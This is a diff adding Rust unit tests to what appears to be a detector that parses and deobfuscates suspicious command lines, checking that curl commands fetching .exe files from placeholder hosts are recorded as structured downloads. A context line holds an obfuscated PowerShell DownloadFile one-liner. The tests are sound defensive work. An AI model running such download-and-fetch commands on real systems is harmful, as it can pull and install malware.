@@ -18505,6 +18505,29 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_multiple_direct_urls_emit_structured_downloads() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl https://curl-multi.example/a.exe https://curl-multi.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://curl-multi.example/a.exe",
+            "https://curl-multi.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "curl multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
     fn curl_preserves_single_percent_variable_url_template() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"curl -s "https://ipinfo.io/%IP_ADDRESS%/json""#, &mut env);
@@ -40497,6 +40520,45 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "curl deob-text --remote-name-all destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_multiple_urls_in_deob_text_emit_structured_downloads() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl https://curl-multi-deob.example/a.exe https://curl-multi-deob.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://curl-multi-deob.example/a.exe",
+            "https://curl-multi-deob.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "curl deob-text multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src.contains("curl-multi-deob.example")
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "curl multi-URL deob text left generic duplicates: {:?}",
             env.traits
         );
     }
